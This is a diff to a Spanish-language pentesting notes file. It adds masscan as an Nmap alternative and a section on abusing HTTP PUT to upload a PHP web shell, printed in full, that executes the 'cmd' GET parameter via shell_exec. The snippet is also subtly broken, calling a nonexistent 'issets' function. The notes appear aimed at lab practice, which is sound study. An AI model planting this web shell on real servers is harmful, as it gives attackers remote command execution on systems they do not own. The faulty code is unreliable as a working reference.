@@ -203,5 +203,27 @@ wfuzz -H 'HOST:FUZZ.IP' -w /usr/share/seclists/Discovery/DNS/subdomains-top1mill
 
 ## Nmap
 
-Para el uso de nmap podemos ver walkthrough de maquinas en HTB u otras platadormas, tambien existen otros escaners de puertos parecidos a Nmap [masscan](https://github.com/robertdavidgraham/masscan.git)
+Para el uso de nmap podemos ver walkthrough de maquinas en HTB u otras platadormas, tambien existen otros escaners de puertos parecidos a Nmap como:
+
+[masscan](https://github.com/robertdavidgraham/masscan.git)
+
+## HTTP Verbs
+
+Existen varios tipos de HTTP Verbs como: **GET, POST, HEAD, PUT, DELETE**.
+En el metodo PUT podemos explotarlo subiendo un archivo .php malicioso con el siguiente codigo.
+
+```php
+<?php
+if (issets($_GET['cmd']))
+{
+        $cmd = $_GET['cmd'];
+        echo '<pre>';
+        $result = shell_exec($cmd);
+        echo $result;
+        echo '</pre>';
+}
+?>
+```
+
+Este nos permite enviar una query via GET que nos interpreta como una shell.
 
